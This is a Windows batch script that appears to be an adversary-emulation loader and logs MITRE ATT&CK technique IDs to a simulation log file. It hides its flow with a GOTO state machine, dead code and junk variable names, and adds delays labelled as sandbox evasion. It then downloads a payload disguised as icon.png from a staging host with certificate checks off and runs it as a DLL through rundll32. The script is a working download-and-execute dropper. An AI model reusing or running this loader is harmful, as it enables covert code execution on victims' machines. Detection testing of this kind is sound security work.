@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder assignments (random variable names)
SET xbqrf=%APPDATA%\10998\56601b45
SET wtyui=21e34345.txt
SET mnbvc=https://10.0.0.49/stage/2/icon.png?10998-7
SET lkjhg=BALAM-S2BO
SET fdsaq=10998
SET zxcvb=7
SET poiuy=%PUBLIC%\\macula-simulations.log
SET qwert=https://10.0.0.49

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM Initially no debugger detection (always false)
SET debugger_detected=0

REM State machine
SET state=0
GOTO dispatch_a1b2c

:dead_label1
REM Never reached
EXIT /B 1

:dispatch_a1b2c
IF %state%==0 GOTO stage_init_h3j4k
IF %state%==17 GOTO stage_delay_p5q6r
IF %state%==42 GOTO stage_heartbeat_s7t8u
IF %state%==99 GOTO stage_chdir_v9w0x
IF %state%==88 GOTO stage_invoke_y1z2a
IF %state%==123 GOTO log_ttp_ok
IF %state%==200 GOTO END

:dead_label2
REM More dead code
SET fake_var=dummy
GOTO dead_label1

:stage_init_h3j4k
REM Log debug start
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: script_start>> "!poiuy!" 2>nul

REM Initial delay 10-20s
ping -n 15 127.0.0.1 >nul
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: initial_delay_done>> "!poiuy!" 2>nul

SET state=17
GOTO dispatch_a1b2c

:dead_label3
REM Dead code
SET dummy=value
GOTO dead_label2

:stage_delay_p5q6r
REM Anti-analysis: debugger check (always false)
IF %debugger_detected%==1 (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: debugger_detected_sleep>> "!poiuy!" 2>nul
    timeout /t 3 /nobreak >nul
)

REM Log evasion attempt (T1497)
echo [!tsvar!][TTP][!lkjhg!][!fdsaq!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!poiuy!" 2>nul

REM Add 5-15s delay (ping method)
SET /A rdelay=%RANDOM% %% 11 + 5
ping -n !rdelay! 127.0.0.1 >nul
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: delay_after_evasion>> "!poiuy!" 2>nul

SET state=42
GOTO dispatch_a1b2c

:stage_heartbeat_s7t8u
REM Heartbeat fetch via curl
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: heartbeat_start>> "!poiuy!" 2>nul

REM Resolve output directory and file paths
CALL SET outdir=%%!xbqrf!%%
CALL SET outfile=%%!wtyui!%%
CALL SET heartbeat_url=%%!mnbvc!%%

curl -k -s -o "!outdir!\!outfile!" "!heartbeat_url!">nul 2>&1
IF EXIST "!outdir!\!outfile!" (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: heartbeat_complete=0>> "!poiuy!" 2>nul
    echo [!tsvar!][TTP][!lkjhg!][!fdsaq!]: T1218^|System Binary Proxy Execution=OK:>> "!poiuy!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: heartbeat_failed>> "!poiuy!" 2>nul
    echo [!tsvar!][TTP][!lkjhg!][!fdsaq!]: T1218^|System Binary Proxy Execution=FAIL:curl_error>> "!poiuy!" 2>nul
)

SET state=99
GOTO dispatch_a1b2c

:dead_label4
REM Dead code to confuse
SET unused=test
GOTO dead_label3

:stage_chdir_v9w0x
REM Change to output directory
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: chdir_start>> "!poiuy!" 2>nul
cd /d "!outdir!">nul 2>&1
IF %ERRORLEVEL%==0 (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: chdir_result=0>> "!poiuy!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: chdir_result=1>> "!poiuy!" 2>nul
)

REM Additional delay 5-15s using timeout
timeout /t 8 /nobreak >nul
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: delay_after_chdir>> "!poiuy!" 2>nul

SET state=88
GOTO dispatch_a1b2c

:dead_label5
REM Another dead block
GOTO dead_label4

:stage_invoke_y1z2a
REM Invoke Stage 2 Loader DLL via rundll32
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: rundll32_start>> "!poiuy!" 2>nul

REM Variable indirection for LOLBIN (runDLL32)
CALL SET target_dll=%%!wtyui!%%
rundll32.exe !target_dll!, RunDLLW>nul 2>&1
IF %ERRORLEVEL%==0 (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: rundll32_result=0>> "!poiuy!" 2>nul
    echo [!tsvar!][TTP][!lkjhg!][!fdsaq!]: T1027^|Obfuscated Files or Information=OK:>> "!poiuy!" 2>nul
) ELSE (
    echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: rundll32_result=1>> "!poiuy!" 2>nul
    echo [!tsvar!][TTP][!lkjhg!][!fdsaq!]: T1027^|Obfuscated Files or Information=FAIL:rundll32_error>> "!poiuy!" 2>nul
)

SET state=123
GOTO dispatch_a1b2c

:log_ttp_ok
REM Final log and exit
echo [!tsvar!][DEBUG][!lkjhg!][!fdsaq!]: script_complete>> "!poiuy!" 2>nul
SET state=200
GOTO dispatch_a1b2c

:END
EXIT /B 0